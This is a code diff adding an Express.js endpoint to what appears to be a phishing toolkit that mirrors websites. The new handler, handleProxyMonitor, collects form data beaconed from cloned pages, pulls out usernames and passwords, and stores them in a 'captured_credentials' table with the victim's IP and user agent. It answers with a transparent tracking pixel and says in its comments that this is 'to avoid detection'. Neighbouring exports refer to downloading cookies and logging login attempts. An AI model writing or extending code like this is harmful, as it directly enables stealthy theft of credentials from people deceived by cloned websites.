@@ -924,6 +924,88 @@ const downloadCookies = async (req, res) => {
   }
 };
 
+/**
+ * Handle stealth monitoring data from mirrored websites
+ * @param {Object} req - Express request object
+ * @param {Object} res - Express response object
+ */
+const handleProxyMonitor = async (req, res) => {
+  const { sessionToken } = req.params;
+  
+  try {
+    // Return a 1x1 transparent pixel to avoid detection
+    const pixel = Buffer.from(
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
+      'base64'
+    );
+    
+    // Extract monitoring data from query parameters (stealth mode)
+    const monitoringData = {
+      data: req.query.data ? JSON.parse(decodeURIComponent(req.query.data)) : null,
+      url: req.query.url ? decodeURIComponent(req.query.url) : null,
+      type: req.query.type || 'form',
+      field: req.query.field ? decodeURIComponent(req.query.field) : null,
+      value: req.query.value ? decodeURIComponent(req.query.value) : null,
+      timestamp: new Date().toISOString(),
+      ip: req.ip,
+      userAgent: req.get('User-Agent')
+    };
+    
+    console.log(`🕵️ Stealth monitoring data received for session ${sessionToken}:`, monitoringData);
+    
+    // Store in database for analysis
+    if (monitoringData.data && Object.keys(monitoringData.data).length > 0) {
+      // Check if this contains credentials
+      const credentials = websiteMirroringService.extractCredentials(monitoringData.data);
+      
+      if (credentials && Object.keys(credentials).length > 0) {
+        console.log('🔑 STEALTH CREDENTIALS CAPTURED:', JSON.stringify(credentials));
+        
+        // Store in captured_credentials table
+        db.run(
+          `INSERT INTO captured_credentials (campaign_id, url, username, password, other_fields, ip_address, user_agent, capture_method)
+           VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
+          [
+            0, // Will be updated with actual campaign ID if available
+            monitoringData.url || 'unknown',
+            credentials.username || credentials.email || null,
+            credentials.password || null,
+            JSON.stringify(monitoringData),
+            req.ip,
+            req.get('User-Agent'),
+            'stealth_monitoring'
+          ],
+          function(err) {
+            if (err) console.error('Error storing stealth credentials:', err);
+            else console.log('💾 Stealth credentials stored with ID:', this.lastID);
+          }
+        );
+      }
+    }
+    
+    res.writeHead(200, {
+      'Content-Type': 'image/png',
+      'Content-Length': pixel.length,
+      'Cache-Control': 'no-cache, no-store, must-revalidate',
+      'Pragma': 'no-cache',
+      'Expires': '0'
+    });
+    res.end(pixel);
+  } catch (err) {
+    console.error('Error handling proxy monitor:', err.message);
+    // Still return pixel to avoid detection
+    const pixel = Buffer.from(
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==',
+      'base64'
+    );
+    res.writeHead(200, {
+      'Content-Type': 'image/png',
+      'Content-Length': pixel.length
+    });
+    res.end(pixel);
+  }
+};
+
 module.exports = {
   saveCampaign,
   getCampaigns,
@@ -936,5 +1018,6 @@ module.exports = {
   stopMirrorSession,
   trackMirrorView,
   getLoginAttempts,
-  downloadCookies
+  downloadCookies,
+  handleProxyMonitor
 };
